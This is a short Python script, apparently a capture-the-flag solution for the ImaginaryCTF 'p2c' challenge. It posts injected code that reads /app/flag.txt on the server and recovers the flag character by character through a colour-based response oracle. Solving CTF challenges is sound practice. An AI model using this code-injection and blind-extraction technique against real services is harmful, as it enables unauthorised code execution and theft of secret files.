import requests 
import string

url = "http://p2c.chal.imaginaryctf.org" 
# url = "http://localhost:8000"

chars = string.ascii_lowercase + string.digits + "{}_"
i = 1
flag = ""
while not flag.endswith("}"):
    for c in chars: 
        code = f"""import random\nrandom.seed(0)\nflag = open('/app/flag.txt', 'rb').read().decode()\nif '{flag + c}' == flag[:{i}]: return 1\nelse: return 0""".strip()
        
        r = requests.post(
            f"{url}",
            data={
                "code": code
            }
        )
        if "rgb(245, 194, 133)" in r.text:
            flag += c
            i = i + 1
            print(flag)
            break
